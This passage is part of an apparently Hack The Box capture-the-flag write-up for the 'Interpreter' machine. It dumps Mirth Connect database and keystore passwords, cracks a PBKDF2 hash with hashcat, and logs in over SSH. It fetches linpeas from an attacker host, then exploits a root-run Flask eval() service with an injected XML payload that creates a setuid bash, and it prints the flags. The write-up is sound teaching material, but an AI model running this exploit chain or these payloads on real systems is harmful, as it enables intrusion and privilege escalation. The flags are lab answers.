mirth:x:103:111::/nonexistent:/usr/sbin/nologin
mysql:x:104:112:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:996::/var/log/laurel:/bin/false
```

| User |
| ---- |
| sedric     |

To not miss out on anything easy we quickly checked the environment variables.

```shell
mirth@interpreter:/usr/local/mirthconnect$ env
PWD=/usr/local/mirthconnect
LOGNAME=mirth
SYSTEMD_EXEC_PID=3517
HOME=/nonexistent
LANG=en_US.UTF-8
INVOCATION_ID=62d8ba8454ed47298bec0a03807fbf67
USER=mirth
SHLVL=2
XTERM=xterm
JOURNAL_STREAM=8:20853
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/usr/lib/jvm/java-17-openjdk-amd64
_=/usr/bin/env
```

Next up we checked what services were listening locally. An interesting service was running on port `54321/TCP` locally which could potentially be useful for `privilege escalation`. Additionally `MySQL` was running on port `3306/TCP`.

```shell
mirth@interpreter:/usr/local/mirthconnect$ ss -tulpn
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                          
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*                                    
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                    
tcp   LISTEN 0      128        127.0.0.1:54321      0.0.0.0:*                                    
tcp   LISTEN 0      50           0.0.0.0:80         0.0.0.0:*    users:(("java",pid=3517,fd=327))
tcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                    
tcp   LISTEN 0      50           0.0.0.0:443        0.0.0.0:*    users:(("java",pid=3517,fd=331))
tcp   LISTEN 0      256          0.0.0.0:6661       0.0.0.0:*    users:(("java",pid=3517,fd=335))
tcp   LISTEN 0      128             [::]:22            [::]:*
```

While examining the `Mirth Connect` configuration directory we found several interesting files. The `mirth.properties` file contained database credentials and other sensitive configuration details.

```shell
mirth@interpreter:/usr/local/mirthconnect/conf$ cat dbdrivers.xml 
<!-- 
        Database driver information
        class = the driver class name, cannot be empty
        name = database driver name to be displayed as, cannot be empty
        template = the template for creating the database connection, cannot be empty
        selectLimit = defines the select statement used for retrieving column information, empty means use the generic query (which could be slow)
        alternativeClasses = A comma-separated list of legacy driver classes (optional).
-->
<drivers>
        <driver class="com.mysql.cj.jdbc.Driver" name="MySQL" template="jdbc:mysql://host:port/dbname" selectLimit="SELECT * FROM ? LIMIT 1" alternativeClasses="com.mysql.jdbc.Driver" />
        <driver class="oracle.jdbc.driver.OracleDriver" name="Oracle" template="jdbc:oracle:thin:@host:port:dbname" selectLimit="SELECT * FROM ? WHERE ROWNUM &lt; 2" />
        <driver class="org.postgresql.Driver" name="PostgreSQL" template="jdbc:postgresql://host:port/dbname" selectLimit="SELECT * FROM ? LIMIT 1" />
        <driver class="net.sourceforge.jtds.jdbc.Driver" name="SQL Server/Sybase (jTDS)" template="jdbc:jtds:sqlserver://host:port/dbname" selectLimit="SELECT TOP 1 * FROM ?" />
        <driver class="com.microsoft.sqlserver.jdbc.SQLServerDriver" name="Microsoft SQL Server" template="jdbc:sqlserver://host:port;databaseName=dbname" selectLimit="SELECT TOP 1 * FROM ?" />
        <driver class="org.sqlite.JDBC" name="SQLite" template="jdbc:sqlite:dbfile.db" selectLimit="SELECT * FROM ? LIMIT 1" />
</drivers>mirth@interpreter:/usr/local/mirthconnect/conf$ cat mirth.properties 
# Mirth Connect configuration file

# directories
dir.appdata = /var/lib/mirthconnect
dir.tempdata = ${dir.appdata}/temp

# ports
http.port = 80
https.port = 443

# password requirements
password.minlength = 0
password.minupper = 0
password.minlower = 0
password.minnumeric = 0
password.minspecial = 0
password.retrylimit = 0
password.lockoutperiod = 0
password.expiration = 0
password.graceperiod = 0
password.reuseperiod = 0
password.reuselimit = 0

# Only used for migration purposes, do not modify
version = 4.4.0

# keystore
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS

# server
http.contextpath = /
server.url =

http.host = 0.0.0.0
https.host = 0.0.0.0

https.client.protocols = TLSv1.3,TLSv1.2
https.server.protocols = TLSv1.3,TLSv1.2,SSLv2Hello
https.ciphersuites = TLS_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_AES_256_GCM_SHA384,TLS_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_DSS_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_DSS_WITH_AES_128_GCM_SHA256,TLS_EMPTY_RENEGOTIATION_INFO_SCSV
https.ephemeraldhkeysize = 2048

# If set to true, the Connect REST API will require all incoming requests to contain an "X-Requested-With" header.
# This protects against Cross-Site Request Forgery (CSRF) security vulnerabilities.
server.api.require-requested-with = true

# CORS headers
server.api.accesscontrolalloworigin = *
server.api.accesscontrolallowcredentials = false
server.api.accesscontrolallowmethods = GET, POST, DELETE, PUT
server.api.accesscontrolallowheaders = Content-Type
server.api.accesscontrolexposeheaders =
server.api.accesscontrolmaxage =

# Determines whether or not channels are deployed on server startup.
server.startupdeploy = true

# Determines whether libraries in the custom-lib directory will be included on the server classpath.
# To reduce potential classpath conflicts you should create Resources and use them on specific channels/connectors instead, and then set this value to false.
server.includecustomlib = true

# administrator
administrator.maxheapsize = 512m

# properties file that will store the configuration map and be loaded during server startup
configurationmap.path = ${dir.appdata}/configuration.properties

# The language version for the Rhino JavaScript engine (supported values: 1.0, 1.1, ..., 1.8, es6).
rhino.languageversion = es6

# options: derby, mysql, postgres, oracle, sqlserver
database = mysql

# examples:
#   Derby                       jdbc:derby:${dir.appdata}/mirthdb;create=true
#   PostgreSQL                  jdbc:postgresql://localhost:5432/mirthdb
#   MySQL                       jdbc:mysql://localhost:3306/mirthdb
#   Oracle                      jdbc:oracle:thin:@localhost:1521:DB
#   SQL Server/Sybase (jTDS)    jdbc:jtds:sqlserver://localhost:1433/mirthdb
#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
#   If you are using the Microsoft SQL Server driver, please also specify database.driver below 
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

# If using a custom or non-default driver, specify it here.
# example:
# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
# (Note: the jTDS driver is used by default for sqlserver)
database.driver = org.mariadb.jdbc.Driver

# Maximum number of connections allowed for the main read/write connection pool
database.max-connections = 20
# Maximum number of connections allowed for the read-only connection pool
database-readonly.max-connections = 20

# database credentials
database.username = mirthdb
database.password = MirthPass123!

#On startup, Maximum number of retries to establish database connections in case of failure
database.connection.maxretry = 2

#On startup, Maximum wait time in milliseconds for retry to establish database connections in case of failure
database.connection.retrywaitinmilliseconds = 10000

# If true, various read-only statements are separated into their own connection pool.
# By default the read-only pool will use the same connection information as the master pool,
# but you can change this with the "database-readonly" options. For example, to point the
# read-only pool to a different JDBC URL:
#
# database-readonly.url = jdbc:...
# 
database.enable-read-write-split = true
```

| Database Username | Database Password | Database    |
| ----------------- | ----------------- | ----------- |
| mirthdb           | MirthPass123!     | mc_bdd_prod |

## Privilege Escalation to sedric

### MariaDB Enumeration

With the database credentials in hand from the configuration file connecting to `MariaDB` seemed like the obvious next move.

```shell
mirth@interpreter:/usr/local/mirthconnect/conf$ mysql -u mirthdb -p'MirthPass123!' -h localhost mc_bdd_prod
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 35
Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [mc_bdd_prod]> 
```

Quick check of what tables were available in the database. The `PERSON` and `PERSON_PASSWORD` tables looked interesting for potential credential extraction.

```shell
MariaDB [mc_bdd_prod]> show tables;
+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| ALERT                 |
| CHANNEL               |
| CHANNEL_GROUP         |
| CODE_TEMPLATE         |
| CODE_TEMPLATE_LIBRARY |
| CONFIGURATION         |
| DEBUGGER_USAGE        |
| D_CHANNELS            |
| D_M1                  |
| D_MA1                 |
| D_MC1                 |
| D_MCM1                |
| D_MM1                 |
| D_MS1                 |
| D_MSQ1                |
| EVENT                 |
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
| SCHEMA_INFO           |
| SCRIPT                |
+-----------------------+
21 rows in set (0.000 sec)
```

We found the user `sedric` which also was a local user on the box and his corresponding `hash`.

```shell
MariaDB [mc_bdd_prod]> select * from PERSON \G;         
*************************** 1. row ***************************
                ID: 2
          USERNAME: sedric
         FIRSTNAME: 
          LASTNAME: 
      ORGANIZATION: 
          INDUSTRY: NULL
             EMAIL: 
       PHONENUMBER: 
       DESCRIPTION: 
        LAST_LOGIN: 2025-09-21 17:56:02
GRACE_PERIOD_START: NULL
      STRIKE_COUNT: 0
  LAST_STRIKE_TIME: NULL
         LOGGED_IN:  
              ROLE: NULL
           COUNTRY: United States
    STATETERRITORY: NULL
       USERCONSENT: 0
1 row in set (0.000 sec)

ERROR: No query specified
```

```shell
MariaDB [mc_bdd_prod]> select * from PERSON_PASSWORD \G;
*************************** 1. row ***************************
    PERSON_ID: 2
     PASSWORD: u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
PASSWORD_DATE: 2025-09-19 09:22:28
1 row in set (0.001 sec)

ERROR: No query specified
```

### Cracking the Hash using hashcat

To crack the hash we first needed to decode it and understand its format. Using Python we decoded the `base64` string and analyzed its structure.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Interpreter/files]
└─$ python3 -c "
import base64
data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
print(f'Length: {len(data)} bytes')
print(f'Hex: {data.hex()}')
# First 8 bytes = salt, rest = hash
salt = data[:8]
hash_part = data[8:]
print(f'Salt ({len(salt)}b): {salt.hex()}')
print(f'Hash ({len(hash_part)}b): {hash_part.hex()}')
"
Length: 40 bytes
Hex: bbff8b0413949da762c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
Salt (8b): bbff8b0413949da7
Hash (32b): 62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
```

The hash appeared to be `PBKDF2-HMAC-SHA256` format with an 8-byte salt and 32-byte hash. We formatted it for `hashcat` mode `10900`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Interpreter/files]
└─$ python3 -c "
import base64
data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
salt = data[:8]
hash_part = data[8:]
print(f'sha256:600000:{base64.b64encode(salt).decode()}:{base64.b64encode(hash_part).decode()}')
"
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

Now it was time to throw `hashcat` at it with the trusty `rockyou.txt` wordlist.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Interpreter/files]
└─$ hashcat -m 10900 sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps= /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i9-10900 CPU @ 2.80GHz, 2949/5898 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2551 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921506
* Keyspace..: 14344384

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD...Ld8Ps=
Time.Started.....: Sat Feb 21 21:21:53 2026 (3 mins, 47 secs)
Time.Estimated...: Sat Feb 21 21:25:40 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       44 H/s (14.97ms) @ Accel:109 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10028/14344384 (0.07%)
Rejected.........: 0/10028 (0.00%)
Restore.Point....: 9592/14344384 (0.07%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:599000-599999
Candidate.Engine.: Device Generator
Candidates.#01...: mariposa1 -> 121189
Hardware.Mon.#01.: Util: 93%

Started: Sat Feb 21 21:21:17 2026
Stopped: Sat Feb 21 21:25:42 2026
```

The password `snowflake1` was successfully retrieved after a few minutes.

| Password   |
| ---------- |
| snowflake1 |

This allowed us to login via `SSH` as the user `sedric`.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh sedric@10.129.2.86
The authenticity of host '10.129.2.86 (10.129.2.86)' can't be established.
ED25519 key fingerprint is: SHA256:Oz7Fk6YvrB8/5uSyuoY+mqLefkwpPaepkXAppxIX0xk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.2.86' (ED25519) to the list of known hosts.
sedric@10.129.2.86's password: 
Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb 21 15:27:09 2026 from 10.10.16.69
sedric@interpreter:~$ 
```

## user.txt

```shell
sedric@interpreter:~$ cat user.txt 
b08cc493abfceb14d27af88c7b42d09c
```

## Enumeration (sedric)

And once more we performed our basic enumeration but this time for the `sedric` user.

```shell
sedric@interpreter:~$ id
uid=1000(sedric) gid=1000(sedric) groups=1000(sedric)
```

Checking the home directory revealed several symbolic links redirecting to `/dev/null` which was likely an attempt to prevent history logging.

```shell
sedric@interpreter:~$ ls -la
total 28
drwx------ 3 sedric sedric 4096 Feb 12 08:46 .
drwxr-xr-x 3 root   root   4096 Aug  7  2025 ..
lrwxrwxrwx 1 root   root      9 Feb 12 08:46 .bash_history -> /dev/null
-rw-r--r-- 1 sedric sedric  220 Aug  7  2025 .bash_logout
-rw-r--r-- 1 sedric sedric 3526 Aug  7  2025 .bashrc
lrwxrwxrwx 1 root   root      9 Sep 22 06:11 .lesshst -> /dev/null
drwxr-xr-x 3 sedric sedric 4096 Sep 19 09:40 .local
lrwxrwxrwx 1 root   root      9 Sep 22 06:11 .mysql_history -> /dev/null
-rw-r--r-- 1 sedric sedric  807 Aug  7  2025 .profile
lrwxrwxrwx 1 root   root      9 Sep 22 06:11 .python_history -> /dev/null
-rw-r----- 1 root   sedric   33 Feb 21 14:02 user.txt
lrwxrwxrwx 1 root   root      9 Sep 22 06:11 .viminfo -> /dev/null
```

We attempted to check `sudo` privileges but the command was not available.

```shell
sedric@interpreter:~$ sudo -l
-bash: sudo: command not found
```

To perform more thorough enumeration we downloaded and executed `linpeas.sh`.

```shell
sedric@interpreter:~$ wget http://10.10.16.69/linpeas.sh|sh
--2026-02-21 15:29:14--  http://10.10.16.69/linpeas.sh
Connecting to 10.10.16.69:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 913470 (892K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                                                                 100%[======================================================================================================================================================================================================================================================================================>] 892.06K   392KB/s    in 2.3s    

2026-02-21 15:29:17 (392 KB/s) - ‘linpeas.sh’ saved [913470/913470]
```

```shell
sedric@interpreter:~$ chmod +x linpeas.sh
```

Running `linpeas.sh` revealed an interesting `Python` process running as `root`.

```shell
sedric@interpreter:~$ ./linpeas.sh
<--- CUT FOR BREVITY --->
root        3518  0.0  0.7  39872 31128 ?        Ss   14:01   0:01 /usr/bin/python3 /usr/local/bin/notif.py
<--- CUT FOR BREVITY --->
```

Examining the script revealed it was a `Flask` application with a dangerous use of `eval()`. IT seemed that the script was vulnerable to `Python eval injection` through the `firstname` parameter due to the dangerous use of `eval()` with f-string templates.

```shell
sedric@interpreter:~$ cat /usr/local/bin/notif.py
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

## Privilege Escalation to root

### Python Eval Injection

Based on the vulnerable `Flask` application running as `root` our next move was exploiting the `eval()` injection to execute system commands. First we created a simple shell script to copy bash and set the `setuid` bit.

```shell
sedric@interpreter:~$ echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > /tmp/pwn.sh
```

```shell
sedric@interpreter:~$ chmod +x /tmp/pwn.sh
```

Now we crafted a malicious `XML` payload to trigger command injection through the `eval()` vulnerability in the `firstname` field.

```shell
sedric@interpreter:~$ python3 -c "                                                                                                        
import urllib.request
data = b'''<patient>                                                                                    
  <firstname>{__import__(\"os\").system(\"/tmp/pwn.sh\")}</firstname>
  <lastname>A</lastname>
  <sender_app>A</sender_app>
  <timestamp>A</timestamp>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>'''
req = urllib.request.Request('http://127.0.0.1:54321/addPatient', data=data, headers={'Content-Type':'application/xml'})
print(urllib.request.urlopen(req).read())
"
b'Patient 0 A (M), 36 years old, received from A at A'
```

The payload was successfully processed by the vulnerable application. Checking `/tmp` confirmed our `setuid` bash binary was created.

```shell
sedric@interpreter:~$ ls -la /tmp
total 1292
drwxrwxrwt 11 root   root      4096 Feb 21 15:34 .
drwxr-xr-x 19 root   root      4096 Feb 16 15:42 ..
drwxrwxrwt  2 root   root      4096 Feb 21 14:01 .font-unix
drwxr-xr-x  2 mirth  mirth     4096 Feb 21 14:01 hsperfdata_mirth
-rw-r--r--  1 mirth  mirth        5 Feb 21 14:01 i4jdaemon__usr_local_mirthconnect_mcservice
drwxrwxrwt  2 root   root      4096 Feb 21 14:01 .ICE-unix
-rw-rw-r--  1 mirth  mirth      118 Feb 21 14:01 install4j_jre_version_mirth
-rwxr-xr-x  1 sedric sedric      54 Feb 21 15:34 pwn.sh
-rwsr-xr-x  1 root   root   1265648 Feb 21 15:34 rootbash
drwx------  3 root   root      4096 Feb 21 14:01 systemd-private-429d07dedf7d497785dcf9cc54dc0648-systemd-logind.service-E9YEfg
drwx------  3 root   root      4096 Feb 21 14:01 systemd-private-429d07dedf7d497785dcf9cc54dc0648-systemd-timesyncd.service-92MnBN
drwx------  2 root   root      4096 Feb 21 14:01 vmware-root
drwx------  2 root   root      4096 Feb 21 14:02 vmware-root_3380-2965384658
drwxrwxrwt  2 root   root      4096 Feb 21 14:01 .X11-unix
drwxrwxrwt  2 root   root      4096 Feb 21 14:01 .XIM-unix
```

The `setuid` bash binary was created with root ownership. Executing it with the `-p` flag granted us a root shell.

```shell
sedric@interpreter:~$ /tmp/rootbash -p
rootbash-5.2#
```

## root.txt

```shell
rootbash-5.2# cat root.txt
11c7b9db4b68cdf3a1859978eef38053
```
